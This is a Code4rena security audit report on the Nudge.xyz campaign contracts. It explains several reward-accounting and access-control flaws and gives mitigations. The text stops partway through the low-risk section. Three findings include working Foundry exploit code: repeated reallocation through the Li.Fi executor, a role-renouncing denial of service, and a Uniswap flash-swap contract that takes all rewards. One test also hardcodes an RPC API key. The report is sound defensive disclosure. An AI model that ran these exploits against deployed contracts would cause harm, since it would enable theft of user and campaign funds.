

# Overview

## About C4

Code4rena (C4) is a competitive audit platform where security researchers, referred to as Wardens, review, audit, and analyze codebases for security vulnerabilities in exchange for bounties provided by sponsoring projects.

A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit outlined in this document, C4 conducted an analysis of the Nudge.xyz smart contract system. The audit took place from March 17 to March 24, 2025.

Final report assembled by Code4rena.

# Summary

The C4 analysis yielded an aggregated total of 4 unique vulnerabilities. Of these vulnerabilities, 0 received a risk rating in the category of HIGH severity and 4 received a risk rating in the category of MEDIUM severity.

Additionally, C4 analysis included 15 reports detailing issues with a risk rating of LOW severity or non-critical.

All of the issues presented here are linked back to their original finding, which may include relevant context from the judge and Nudge team. 

# Scope

The code under review can be found within the C4 Nudge.xyz repository, and is composed of 7 smart contracts written in the Solidity programming language and includes 641 lines of Solidity code.

# Severity Criteria

C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.

High-level considerations for vulnerabilities span the following key areas when conducting assessments:

- Malicious Input Handling

- Escalation of privileges

- Arithmetic

- Gas use

For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on the C4 website, specifically our section on Severity Categorization.

# Medium Risk Findings (4)

## [M-01] Unauthorized reallocation in `NudgeCampaign::handleReallocation` and reward disruption vulnerability in `NudgeCampaign::invalidateParticipations`

Submitted by roccomania, also found by 0xN3x, 0xrex, 10ap17, 4th05, audityourcontracts, Bobai23, Breeje, BroRUok, ChainProof, crunter, cryptomoon, d3e4, dd0x7e8, falconhoof, franfran20, frndz0ne, givn, HalalAudits, heheboii, hgrano, hl_, Ikigai, immeas, Kalogerone, KannAudits, kazan, leegh, limmmmmeeee, mahdifa, merlin, moray5554, Mylifechangefast_eth, Pelz, phaseTwo, phoenixV110, Sancybars, seeques, SpicyMeatball, steadyman, t0x1c, Timeless, tusharr1411, Uddercover, VAD37, Weed0607, y4y, and zarkk01

https://github.com/code-423n4/2025-03-nudgexyz/blob/main/src/campaign/NudgeCampaign.sol#L164-L233

https://github.com/code-423n4/2025-03-nudgexyz/blob/main/src/campaign/NudgeCampaign.sol#L308-L321

### Summary

The `NudgeCampaign::handleReallocation` function allows any attacker to manipulate reward allocations through flash loans or repeated calls with real fund via Li.Fi’s executor. This can lead to reward depletion and disruption of legitimate user rewards even after invalidating the attacker

### Vulnerability Details

The vulnerability stems from two main issues:

- Insufficient Caller Validation: While the function checks for `SWAP_CALLER_ROLE`, this role is assigned to Li.Fi’s executor which can be called by anyone, effectively bypassing intended access controls.

- 
Reward Accounting Flaw: The system fails to properly reset claimable amounts when participations are invalidated, allowing attackers to:

- Claim all allocations through flash loans

- Perform repeated reallocations via Li.Fi’s executor

- Cause permanent reduction of available rewards through multiple invalidations

The `invalidateParticipations` function only subtracts from `pendingRewards` but doesn’t return the fees to the claimable pool, creating a growing discrepancy in reward accounting.

### Proof of Concept

Here is a test to prove this. This was run in mainnet fork. Since this will be deployed on Ethereum and other L2s in from the doc. Create a new test file and add this to the test suite `src/test/NudgeCampaignAttackTest.t.sol`.

```
// SPDX-License-Identifier: UNLICENSEDpragmasolidity ^0.8.28;import { Test, console } from"forge-std/Test.sol";import"@openzeppelin/contracts/utils/math/Math.sol";import { NudgeCampaign } from"../campaign/NudgeCampaign.sol";import { NudgeCampaignFactory } from"../campaign/NudgeCampaignFactory.sol";import"@openzeppelin/contracts/token/ERC20/IERC20.sol";import { FlashLoanAttackContract } from"./FlashLoanAttackContractTest.t.sol";import { IBaseNudgeCampaign } from"../campaign/interfaces/INudgeCampaign.sol";libraryLibSwap {structSwapData {addresscallTo;addressapproveTo;addresssendingAssetId;addressreceivingAssetId;uint256fromAmount;bytescallData;boolrequiresDeposit; }}interfaceILifiExecutorisIERC20 {functionerc20Proxy() externalviewreturns (address);functionswapAndExecute(bytes32_transactionId, LibSwap.SwapData[] calldata_swapData,address_transferredAssetId,addresspayable_receiver,uint256_amount )externalpayable;}contractNudgeCampaignAttackTestisTest {NudgeCampaignprivatecampaign;addressNATIVE_TOKEN = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;addressowner;uint256constantREWARD_PPQ = 2e13;uint256constantINITIAL_FUNDING = 100_000e18;addresscampaignAdmin = address(14);addressnudgeAdmin = address(15);addresstreasury = address(16);addressoperator = address(17);addressalternativeWithdrawalAddress = address(16);addresscampaignAddress;uint32holdingPeriodInSeconds = 60 * 60 * 24 * 7; // 7 daysuint256rewardPPQ = 2e13;uint256RANDOM_UUID = 111_222_333_444_555_666_777;uint16DEFAULT_FEE_BPS = 1000;NudgeCampaignFactoryfactory;addressconstantSWAP_CALLER = 0x2dfaDAB8266483beD9Fd9A292Ce56596a2D1378D; //LIFI EXECUTORstringconstantMAINNET_RPC_URL = "https://eth-mainnet.g.alchemy.com/v2/j7SKDcG36WqFJxaAGYTsKo6IIDFSmFhl";IERC20constantWETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2); //rewardTokenIERC20constantDAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F); //toTokenILifiExecutorconstantLIFI_EXECUTOR = ILifiExecutor(0x2dfaDAB8266483beD9Fd9A292Ce56596a2D1378D);FlashLoanAttackContractflashLoanAttackContract;addressattacker = makeAddr("Attacker");uint256[] pIDsWithOne = [1];functionsetUp() public {vm.createSelectFork(MAINNET_RPC_URL);owner = msg.sender;factory = newNudgeCampaignFactory(treasury, nudgeAdmin, operator, SWAP_CALLER);campaignAddress = factory.deployCampaign(holdingPeriodInSeconds,address(DAI),address(WETH),REWARD_PPQ,campaignAdmin,0,alternativeWithdrawalAddress,RANDOM_UUID );campaign = NudgeCampaign(payable(campaignAddress));flashLoanAttackContract = newFlashLoanAttackContract(campaign);vm.deal(campaignAdmin, 10ether);deal(address(WETH), campaignAdmin, 10_000_000e18);vm.prank(campaignAdmin);WETH.transfer(campaignAddress, INITIAL_FUNDING); }functiondeployCampaign(addressDAI_, addressWETH_, uint256rewardPPQ_) internalreturns (NudgeCampaign) {campaignAddress = factory.deployCampaign(holdingPeriodInSeconds, DAI_, WETH_, rewardPPQ_, campaignAdmin, 0, alternativeWithdrawalAddress, RANDOM_UUID );campaign = NudgeCampaign(payable(campaignAddress));returncampaign; }functiontest_attackReallocationTest() public {uint256count;uint256toAmount = 300_768e18;deal(address(DAI), attacker, toAmount);while (campaign.claimableRewardAmount() > 6000e18) {pIDsWithOne[0] = count + 1;bytesmemorydataToCall = abi.encodeWithSelector(campaign.handleReallocation.selector, RANDOM_UUID, address(SWAP_CALLER), address(DAI), toAmount, "" );bytes32transactionId = keccak256(abi.encode(DAI, block.timestamp, tx.origin));LibSwap.SwapData[] memoryswapData = newLibSwap.SwapData[](1);swapData[0] =LibSwap.SwapData(address(campaign), address(campaign), address(DAI), address(DAI), toAmount, dataToCall, false);uint256gasStart = gasleft();vm.startPrank(attacker);IERC20(DAI).approve(LIFI_EXECUTOR.erc20Proxy(), toAmount);LIFI_EXECUTOR.swapAndExecute(transactionId, swapData, address(DAI), payable(attacker), toAmount);vm.stopPrank();uint256gasEnd = gasleft();if (count == 0) {console.log("Gas used per attack = ", gasStart - gasEnd); }vm.prank(operator);campaign.invalidateParticipations(pIDsWithOne);count++; }uint256newClaimableReward = campaign.claimableRewardAmount();console.log("Final Claimable Reward:", newClaimableReward);console.log("Number of times attack ran", count); }}
```

Then run with `forge test --mt test_attackReallocationTest -vvv`. Here is the result:

```
 forge test --mt test_attackReallocationTest -vvv[⠰] Compiling...[⠔] Compiling 1 files with Solc 0.8.28[⠒] Solc 0.8.28 finished in 4.06sCompiler run successful!Ran 1 test for src/test/NudgeCampaignAttackTest.t.sol:NudgeCampaignAttackTest[PASS] test_attackReallocationTest() (gas: 40900516)Logs: Gas used per attack = 432808 Final Claimable Reward: 5558848000000000000000 Number of times attack ran 157Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 10.94s (3.72s CPU time)Ran 1 test suite in 10.96s (10.94s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

- Gas used per attack: 432808

- Attack ran 157 times

- Total gas: `432808 * 157 = 67950856`
With the current Ethereum gas price of 0.701 gwei per gas, it’ll cost 0.`701 * 67950856` gwei = 47633550.056 gwei

- This is 0.0476 Ether (Current Ether price is `$2087`). `2087 * 0.0476 = $99.34`

- It cost about `$99.34` in gas to launch the attack. This will be cheaper on L2, making this attack very possible.

### Impact

This vulnerability allows attackers to:

- Maliciously allocate campaign rewards through flash loans

- Perform denial-of-service attacks on legitimate users’ rewards

- Permanently reduce available rewards through repeated invalidations

- Disrupt the intended economic model of the campaign system

The attack could be executed at minimal cost and would be difficult to detect until rewards are significantly depleted.

### Tools Used

Foundry

### Recommended mitigation steps

Fix reward accounting:

```
functioninvalidateParticipations(uint256[] calldatapIDs) externalonlyNudgeOperator {for (uint256i = 0; i < pIDs.length; i++) {Participationstorageparticipation = participations[pIDs[i]];if (participation.status != ParticipationStatus.PARTICIPATING) {continue; }participation.status = ParticipationStatus.INVALIDATED;uint256totalReward = participation.rewardAmount + (participation.rewardAmount * feeBasisPoints / BASIS_POINTS);pendingRewards -= participation.rewardAmount;claimableRewards += totalReward; // Add to claimable pool }emitParticipationInvalidated(pIDs);}
```

raphael (Nudge.xyz) confirmed

## [M-02] Anyone can DOS `handleReallocation` over and over

Submitted by hakunamatata, also found by 056Security, 0xkrodhan, 0xShitgem, and HaidutiSec

https://github.com/code-423n4/2025-03-nudgexyz/blob/main/src/campaign/NudgeCampaign.sol#L164-L233

https://github.com/code-423n4/2025-03-nudgexyz/blob/main/src/campaign/NudgePointsCampaigns.sol#L126-L178

https://github.com/code-423n4/2025-03-nudgexyz/blob/main/src/campaign/NudgeCampaignFactory.sol#L4

### Finding description and impact

Li.Fi’s Executor contract is granted `SWAP_CALLER_ROLE`. The function `handleReallocation` is used inside the protocol to notify about user’s reallocation and can only be called by address that has `SWAP_CALLER_ROLE`. The intention of the protocol is to use the executor’s functions so that executor swaps assets and then calls `handleReallocation` inside `NudgeCampaign` / `NudgePointsCampaign` contract.

However, the Executor contract that has as a `SWAP_CALLER_ROLE` can be used by anyone (its functions do not have access control restrictions which is expected), anyone can call function `swapAndExecute`. This means that any user can call the `swapAndExecute` function and instruct the `Executor` to call arbitrary functions on other contracts.

As a result, an attacker can use the `Executor` to call `renounceRole` on the `NudgeCampaignFactory` contract, causing the `Executor` to lose its `SWAP_CALLER_ROLE`. This leads to DOS of every next `handleReallocation` call from Executor. Admin has to `grantRole` again to Executor contract, but user can repeat the process of `renouncingRole` using Executor. 

Executor function that can be called is here.

### Proof of Concept

In order to POC to work, we must copy and paste contracts related to Executor and ERC20Proxy (the contract used by Executor) from official Li Fi’s contract repository so that we can use Executor inside our tests.

I’ve put LiFi’s contracts inside campaign directory in new folders created by me; Errors, Helpers, Interfaces, Libraries and Periphery:

```
// SPDX-License-Identifier: UNLICENSEDpragmasolidity ^0.8.28;import { Test } from"forge-std/Test.sol";import { Math } from"@openzeppelin/contracts/utils/math/Math.sol";import { ERC20 } from"@openzeppelin/contracts/token/ERC20/ERC20.sol";import { NudgeCampaign } from"../campaign/NudgeCampaign.sol";import { NudgeCampaignFactory } from"../campaign/NudgeCampaignFactory.sol";import { INudgeCampaign, IBaseNudgeCampaign } from"../campaign/interfaces/INudgeCampaign.sol";import"../mocks/TestERC20.sol";import { console } from"forge-std/console.sol";import { Executor } from"../campaign/Periphery/Executor.sol";import { ERC20Proxy } from"../campaign/Periphery/ERC20Proxy.sol";import { LibSwap } from"../campaign/Libraries/LibSwap.sol";import { TestUSDC } from"../mocks/TestUSDC.sol";contractTestDOSReallocationisTest {usingMathforuint256;NudgeCampaignprivatecampaign;NudgeCampaignFactoryprivatefactory;TestERC20privatetargetToken;TestERC20privaterewardToken;addressowner = address(1);addressalice = address(11);addressbob = address(12);addresscampaignAdmin = address(13);addressnudgeAdmin = address(14);addresstreasury = address(15);addressswapCaller = address(16);addressoperator = address(17);addressalternativeWithdrawalAddress = address(18);bytes32publicconstantSWAP_CALLER_ROLE = keccak256("SWAP_CALLER_ROLE");uint16constantDEFAULT_FEE_BPS = 1000; // 10%uint32constantHOLDING_PERIOD = 7days;uint256constantREWARD_PPQ = 2e13;uint256constantINITIAL_FUNDING = 100_000e18;uint256constantPPQ_DENOMINATOR = 1e15;addressconstantNATIVE_TOKEN = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;addressbadActor = address(0xBAD);Executorexecutor;addressexecutorOwner = address(19);ERC20Proxyerc20Proxy;functionsetUp() public {vm.startPrank(owner);//deploy erc20 proxy which is part of Li Fi protocolerc20Proxy = newERC20Proxy(owner);vm.stopPrank();// Deploy tokenstargetToken = newTestERC20("Target Token", "TT");rewardToken = newTestERC20("Reward Token", "RT");//deploy executor which is part of li fi protocolexecutor = newExecutor(address(erc20Proxy), executorOwner);swapCaller = address(executor);console.log(address(executor));// Deploy factory with rolesfactory = newNudgeCampaignFactory(treasury, nudgeAdmin, operator, address(executor));vm.startPrank(owner);//set executor as authorized caller as in Li Fi protocolerc20Proxy.setAuthorizedCaller(address(executor), true);vm.stopPrank();// Fund test contract and approve factoryrewardToken.mintTo(INITIAL_FUNDING, address(this));rewardToken.approve(address(factory), INITIAL_FUNDING);// Deploy and fund campaigncampaign = NudgeCampaign(payable(factory.deployAndFundCampaign(HOLDING_PERIOD,address(targetToken),address(rewardToken),REWARD_PPQ,campaignAdmin,0, // start immediatelyalternativeWithdrawalAddress,INITIAL_FUNDING,1// uuid ) ) );// Setup swapCallerdeal(address(targetToken), swapCaller, INITIAL_FUNDING);vm.prank(swapCaller);targetToken.approve(address(campaign), type(uint256).max); }functiontest_DOSReallocation() public {vm.deal(badActor, 10ether);vm.startPrank(badActor);//deploy test usdc contract - this can be custom contract deployed by the attackerTestUSDCtestUsdc = newTestUSDC("A", "B");testUsdc.mintTo(1ether, badActor);testUsdc.approve(address(executor), 1);testUsdc.approve(address(erc20Proxy), 1);bytesmemoryrenounceRoleCallData =abi.encodeWithSignature("renounceRole(bytes32,address)", SWAP_CALLER_ROLE, address(executor));LibSwap.SwapDatamemorysd1 = LibSwap.SwapData(//callTo:address(factory),//approveTo:address(testUsdc),//sendingAssetId:address(testUsdc),//receivingAssetId:address(testUsdc),//fromAmount:1,//callData:renounceRoleCallData,//requiresDeposit:false );LibSwap.SwapData[] memoryswapDataArray = newLibSwap.SwapData[](1);swapDataArray[0] = sd1;bytes32transactionId = bytes32(uint256(1));addresstransferredAssetId = address(testUsdc);addressreceiver = address(badActor);uint256amount = 1;//attacker orders executor to execute renounceRole function on factory contract, leading to loss of role for executor// all of the future handleReallocations will revert, unless Nudge Admin will grant SWAP_CALLER_ROLE to executor//but the attacker can repeat this process indefinitely executor.swapAndExecute(transactionId, swapDataArray, address(testUsdc), payable(receiver), amount);vm.stopPrank();assert(!factory.hasRole(SWAP_CALLER_ROLE, address(executor))); }}
```

### Recommended mitigation steps

Disallow `Executor` to renounce their role, or store executor as address and only verify that `msg.sender` is executor; which would make it impossible to renounce the role from the executor.

raphael (Nudge.xyz) confirmed

## [M-03] All reallocate cross-chain token and rewards will be lost for the users using the account abstraction wallet

Submitted by 0xDemon, also found by Mike_Bello90

https://github.com/code-423n4/2025-03-nudgexyz/blob/88797c79ac706ed164cc1b30a8556b6073511929/src/campaign/NudgeCampaign.sol#L206

https://github.com/code-423n4/2025-03-nudgexyz/blob/88797c79ac706ed164cc1b30a8556b6073511929/src/campaign/NudgeCampaign.sol#L271-L274

https://github.com/code-423n4/2025-03-nudgexyz/blob/88797c79ac706ed164cc1b30a8556b6073511929/src/campaign/NudgePointsCampaigns.sol#L160

### Finding description and impact

Users with account abstraction wallets have a different address across different chains for same account, so if user using an account abstraction wallet initiate reallocate cross-chain token, the `toToken` will be sent to wrong address and lost permanently. 

With 6.4 million users and 100+ billion assets, there is very high risk that safe wallet users will try to initiate cross-chain reallocations and suffering a loss

In addition, there are other impacts, the user cannot claim rewards on the destination chain and the rewards for that user end up being locked forever in the `NugeCampaign.sol` contract because no one can’t rescue the reward token even with `rescueTokens()` and `withdrawRewards()` functions.

### Proof of Concept

Based on the Nudge docs and Lifi SDK, the user flow for cross-chain reallocation is seen below:

- Alice connect her ethereum mainnet address on Nudge campaign website.

- Alice initiate cross-chain reallocation for reallocate `100 ETH` from Ethereum mainnet to `200_000 USDC` on Base.

- After LiFi performed swap, then it call `handleReallocation()` with these params:

```
functionhandleReallocation(uint256campaignId_,addressuserAddress,addresstoToken,uint256toAmount,bytesmemorydata ) externalpayablewhenNotPaused {
```

- The `userAddress` param will be filled by the ethereum mainnet address owned by Alice.

- Then `200_000 USDC` will be sent to that address via the `_transfer()` function.

```
_transfer(toToken, userAddress, amountReceived);function_transfer(addresstoken, addressto, uint256amount) internal {if (token == NATIVE_TOKEN) { (boolsent, ) = to.call{value: amount}("");if (!sent) revertNativeTokenTransferFailed(); } else {SafeERC20.safeTransfer(IERC20(token), to, amount); } }
```

- After that, reward will be calculated and stored in the `Participation` struct:

```
participations[pID] = Participation({status:ParticipationStatus.PARTICIPATING,userAddress:userAddress,toAmount:amountReceived,rewardAmount:userRewards,startTimestamp:block.timestamp,startBlockNumber:block.number });
```

- Users can claim rewards by calling `claimRewards()` and entering the pID in the `Participation` struct.

Let’s breakdown how users can loss all reallocated cross-chain tokens and the rewards:

- Cross-chain reallocates token

It can be seen in step 5, `toToken` amount or in this example is `200_000 USDC` will be transferred to `userAddress`. The main problem arises here, because as explained the abstraction wallet account has a different address across chains. Thus, the `toToken` amount will be transferred to the address at `userAddress` which may not be the address owned by Alice and Alice will lose all reallocated tokens.

And also keep in mind, on current implementation on the Nudge website, there is no option for users to enter the recipient address on the destination chain when performing cross-chain reallocations. Not even in the existing docs. This proves that the Nudge protocol is not aware of this issue.

- The rewards

User can claim rewards by calling `claimRewards()`. One of the checks in this function is whether `msg.sender` is the same as the `userAddress` in the participation struct:

```
// Verify that caller is the participation addressif (participation.userAddress != msg.sender) { revertUnauthorizedCaller(pIDs[i]); }
```

The main problem arises here, because as explained the abstraction wallet account has a different address across chain. This means Alice cannot claim her reward on the Base chain because the address it has on the Base chain (as `msg.sender`) is different from the address on ethereum mainnet chain (as `participation.userAddress`).

Note:

- This issue not only affects regular campaigns but also `NudgePointCampaign`.

- This issue is similar and inspired by this valid issue.

### Recommended mitigation steps

Give the user the option to pass in the address. The tokens should be transferred on the destination chain. Pass in the warning for account abstraction wallet holders to not to pass the same wallet address when initiate cross-chain reallocations.

raphael (Nudge.xyz) confirmed

## [M-04] Not verifying that transaction initiator is the actual participator allows malicious user to allocate full reward as Uniswap V2 pool

Submitted by Luc1jan, also found by hgrano and t0x1c

https://github.com/code-423n4/2025-03-nudgexyz/blob/382a59c315b8a421f2acae5fd856bb9ca48a7a10/src/campaign/NudgeCampaign.sol#L164-L233

### Finding description and impact

To participate in campaign, user has to call swap provider (Li.Fi) `Executor::swapAndExecute` function. This function performs swap required to get campaign `target` tokens and calls `NudgeCampaign::handleReallocation`. `NudgeCampaign` will receive and forward `target` tokens to `userAddress` and update user participation details accordingly. `handleReallocation` is only callable by `SWAP_CALLER_ROLE` which is given to `Executor` to make sure user swaps tokens before being able to participate.

However, user can encode `NudgeCampaign::handleReallocation` calldata inside `Executor::swapAndExecute` and set arbitrary `userAddress` that doesn’t have to be the same as the swap initiator address. This allows user to “gift” allocation to anyone. Protocol backend will track `userAddress``target` tokens balance and invalidate participation if the balance drops below participation amount, so this should not be an issue.

Yet, this becomes problematic if there is an existing Uniswap V2 pool in which one of the tokens is `target` token. This is highly probable, since `target` tokens must have a DEX pool in order to be “bought” via swap provider. Malicious user could take advantage of this and create smart contract that would initiate a flash swap from the pool, borrow substantial amount of `target` tokens, and encode a swap call on `Executor::swapAndExecute` such that it forwards all tokens to the `NudgeCampaign` calling `handleReallocation` with `userAddress` of the Uniswap pool. `NudgeCampaign` would register valid participation because `handleReallocation` was called from `Executor` and monitoring system wouldn’t invalidate participation since pool has more than enough tokens to pass the balance checks. Flash swap would be successful because `NudgeCampaign` would send all tokens back to pool in the same transaction.

Attacker would have to buy some tokens to cover Uniswap’s 0.3% fee. This is the only cost for the attacker. Fee can be calculated using unallocated amount and PPQ (rewards factor):

```
(UnallocatedRewards * PPQ_DENOMINATOR / REWARD_PPQ) * 0.3%
```

It’s important to note here that funds can be recovered if protocol invalidates malicious participation manually. If this doesn’t happen, funds will stay locked in `NudgeCampaign`. More importantly, other users won’t be able to participate so whole campaign would be in Denial of Service and with good chance that nobody would even notice it, most likely being marked as success, while campaign admin basically burned rewards for no buying volume in return which is the reason campaign is created for.

Additionally, the exploit wouldn’t work with any other lending protocol because of different flash loan implementation details. Here, for flash loan to be successful pool will verify that funds are returned by checking pool balance at the end, while other protocols usually pull the borrowed funds from the borrower which in this case wouldn’t be possible since `NudgeCampaign` returns funds for attacker who is borrower.

### Proof of Concept

Install Uniswap v2 and Li.Fi repositories (note that we are not using official Uniswap repo because of version mismatch to simplify PoC, it runs successfully on official v2-core contracts, but they require some editing to be able to compile with Solidity 0.8):

```
forge install lifinance/contracts --no-commitforge install islishude/uniswapv2-solc0.8 --no-commit
```

Update `remappings.txt`:

```
+ v2-core/=lib/uniswapv2-solc0.8/contracts/+ lifi/=lib/contracts/src/
```

Flatten the `UniswapV2Factory.sol`:

```
forge flatten lib/uniswapv2-solc0.8/contracts/UniswapV2Factory.sol > lib/uniswapv2-solc0.8/contracts/UniswapV2Factory.flattened.sol
```

Fix the version in `lib/uniswapv2-solc0.8/contracts/UniswapV2Factory.flattened.sol`:

```
 // SPDX-License-Identifier: GPL-3.0-or-later+ pragma solidity ^0.8.4;- pragma solidity =0.8.4;
```

Edit line 166 in `lib/contracts/src/Periphery/Executor.sol` to simplify PoC:

```
- erc20Proxy.transferFrom(- _transferredAssetId,- msg.sender,- address(this),- _amount- );+ IERC20(_transferredAssetId).transferFrom(msg.sender, address(this), _amount);
```

Create `Attack.sol` contract in `src/mocks/`:

```
// SPDX-License-Identifier: MITpragmasolidity ^0.8.22;import {Executor, LibSwap} from"lifi/Periphery/Executor.sol";import {UniswapV2Pair, UniswapV2Factory} from"v2-core/UniswapV2Factory.flattened.sol";import {IERC20, NudgeCampaign} from"../campaign/NudgeCampaign.sol";import {console} from"forge-std/console.sol";contractAttack {IERC20publictoken;UniswapV2Pairpublicpair;NudgeCampaignpubliccampaign;Executorpublicexecutor;constructor(address_token, address_pair, address_campaign, address_executor) {token = IERC20(_token);pair = UniswapV2Pair(_pair);campaign = NudgeCampaign(payable(_campaign));executor = Executor(payable(_executor)); }functionattack() public {// calculate required tokens take all unallocated reward tokensuint256unallocatedRewards = campaign.claimableRewardAmount();uint256toTokensRequired = unallocatedRewards * 1e15 / 2e13;bytesmemoryswapData = newbytes(0xff);pair.swap(toTokensRequired, 0, address(this), swapData); }functionuniswapV2Call(addresssender, uint256amount0, uint256amount1, bytescalldatadata) public {// encoded contract call from Executor to Campaign::handleReallocation()bytesmemorynoData = bytes("");bytesmemoryhandleReallocationCall = abi.encodeWithSelector(NudgeCampaign.handleReallocation.selector,campaign.campaignId(),address(pair),address(token),amount0,noData );// swap that's passed to Executor::swapAndExecute()LibSwap.SwapDatamemoryswapData = LibSwap.SwapData(address(campaign), // callToaddress(campaign), // approveToaddress(token), // sendingAssetIdaddress(token), // receivingAssetIdamount0, // fromAmounthandleReallocationCall, // callDatafalse// requiresDeposit );LibSwap.SwapData[] memoryswapsArr = newLibSwap.SwapData[](1);swapsArr[0] = swapData;token.approve(address(executor), type(uint256).max);// call the swapexecutor.swapAndExecute(keccak256("attackTransactionID"), swapsArr, address(token), payable(address(pair)), amount0 );// pay fee to Uniswaptoken.transfer(address(pair), token.balanceOf(address(this))); }}
```

Update `test/NudgeCampaign.t.sol`:

- 
Add imports:

```
+ import {Executor, LibSwap} from "lifi/Periphery/Executor.sol";+ import {UniswapV2Pair, UniswapV2Factory} from "v2-core/UniswapV2Factory.flattened.sol";+ import {Attack} from "../mocks/Attack.sol";
```

- 
Add `executor` state variable:

```
 TestERC20 toToken; TestERC20 rewardToken; NudgeCampaignFactory factory;+ Executor executor;
```

- 
Update `setUp` function:

```
function setUp() public {+ address executorProxyErc20 = makeAddr("Executor proxy erc20");+ executor = new Executor(address(executorProxyErc20), owner); owner = msg.sender; toToken = new TestERC20("Incentivized Token", "IT"); rewardToken = new TestERC20("Reward Token", "RT");+ factory = new NudgeCampaignFactory(treasury, nudgeAdmin, operator, address(executor));- factory = new NudgeCampaignFactory(treasury, nudgeAdmin, operator, swapCaller); ...}
```

- 
And finally, the exploit test case:

```
functiontest_userClaimsAllRewards() public {// deploy uniswap factoryUniswapV2FactoryuniswapFactory = newUniswapV2Factory(owner);vm.startPrank(campaignAdmin);// mint tokens for pool LPTestERC20weth = newTestERC20("Wrapped ETH", "WETH");weth.faucet(100_000_000e18);toToken.faucet(100_000_000e18);// create pool (toToken, weth)UniswapV2Pairpair = UniswapV2Pair(uniswapFactory.createPair(address(toToken), address(weth)));// add liquidity 1:1 to keep it simpletoToken.transfer(address(pair), 100_000_000e18);weth.transfer(address(pair), 100_000_000e18);pair.mint(campaignAdmin);vm.stopPrank();addressattacker = makeAddr("attacker");vm.startPrank(attacker);// deploy attacker contractAttackattack = newAttack(address(toToken), address(pair), address(campaign), address(executor));// send Uniswap 0.3% fee => 15k tokenstoToken.mintTo(15_100e18, address(attack));attack.attack();vm.stopPrank();// verify attack successuint256unallocatedRewards = campaign.claimableRewardAmount();assertEq(unallocatedRewards, 0); // there are no unallocated rewards left (IBaseNudgeCampaign.ParticipationStatusstatus, addressuserAddress, uint256amount, uint256rewardAmount,,) = campaign.participations(1);assertEq(uint8(status), uint8(IBaseNudgeCampaign.ParticipationStatus.PARTICIPATING)); // participation is activeassertEq(userAddress, address(pair)); // participator is uniswap pair contractassertGe(toToken.balanceOf(address(pair)), amount); // pair has enough tokens and won't get invalidatedassertEq(rewardAmount, INITIAL_FUNDING - INITIAL_FUNDING * DEFAULT_FEE_BPS / 10_000); // attacker allocated full reward - 10% nudge fee}
```

To run:

```
forge test --mt test_userClaimsAllRewards
```

Test demonstrates that attacker can basically route borrowed tokens from flash swap through `Executor` and `NudgeCampaign`, register new participation as Uniswap V2 Pool and return these tokens, all in the same transaction. Effectively, allocating all rewards for no value provided to campaign owners and making campaign unusable, while protocol would treat it as success.

### Recommended mitigation steps

You could modify the `NudgeCampaign::handleReallocation` such that transaction initiator must be the actual participator:

```
require(userAddress == tx.origin, "participator must be transaction initiator")
```

Or, you could blacklist pools addresses and let monitoring system do the invalidation.

raphael (Nudge.xyz) confirmed

# Low Risk and Non-Critical Issues

For this audit, 15 reports were submitted by wardens detailing low risk and non-critical issues. The report highlighted below by calc1f4r received the top score from the judge.

The following wardens also submitted reports: 0xshuayb, 0xWeakSheep, bigbear1229, BRONZEDISC, BUGBeast15, dd0x7e8, Ekene, holtzzx, Jatique, kazan, mitrev, rama_tavanam, teoslaf, and uba081.

## [01] Missing validation for `holdingPeriodInSeconds` in `NudgePointsCampaigns`

The `holdingPeriodInSeconds` parameter lacks validation in both `createPointsCampaign` and `createPointsCampaigns` functions within the `NudgePointsCampaigns` contract, allowing privileged users to create campaigns with a zero holding period. This contradicts the core design principle of the protocol’s token holding incentive mechanism.

### Vulnerability Details

In the `NudgePointsCampaigns` contract, the protocol validates the `targetToken` parameter but fails to validate whether the `holdingPeriodInSeconds` is greater than zero. This oversight allows administrators to create campaigns that don’t enforce any actual holding period.

The `holdingPeriodInSeconds` parameter represents the duration users must hold tokens to qualify for rewards, which is a fundamental mechanic of the protocol’s incentive system. A holding period of 0 seconds essentially bypasses this core requirement.

Affected functions:

- `createPointsCampaign`

- `createPointsCampaigns`

### Impact

If `holdingPeriodInSeconds` is set to 0:

- Users would immediately qualify for rewards without actually holding tokens for any meaningful duration.

- This undermines the stated design goal of incentivizing token retention.

- Creates inconsistent behavior compared to other campaigns where holding periods are enforced.

- Violates user expectations and the protocol’s documentation which specifically mentions holding periods as a requirement.

While this wouldn’t directly lead to financial loss, it could be exploited to distribute rewards in a manner inconsistent with the protocol’s stated objectives and potentially allow for gaming of the reward mechanism.

### Proof of Concept

In NudgePointsCampaigns.sol, the validation for the `createPointsCampaign` function:

```
functioncreatePointsCampaign(uint256campaignId,uint32holdingPeriodInSeconds,addresstargetToken) externalonlyRole(NUDGE_ADMIN_ROLE) returns (Campaignmemory) {// Validates target token but not holding periodif (targetToken == address(0)) {revertInvalidTargetToken(); }// No validation for holdingPeriodInSeconds == 0if (campaigns[campaignId].targetToken != address(0)) {revertCampaignAlreadyExists(); }// Creates the campaign regardless of holdingPeriodInSeconds valuecampaigns[campaignId] = Campaign({targetToken:targetToken,totalReallocatedAmount:0,holdingPeriodInSeconds:holdingPeriodInSeconds,pID:0 });emitPointsCampaignCreated(campaignId, holdingPeriodInSeconds, targetToken);returncampaigns[campaignId];}
```

Similarly, in the `createPointsCampaigns` function (lines 86-105), batch campaign creation has the same validation gap.

### Recommended mitigation steps

Add validation for `holdingPeriodInSeconds` in both functions to ensure it’s greater than zero:

For `createPointsCampaign`:

```
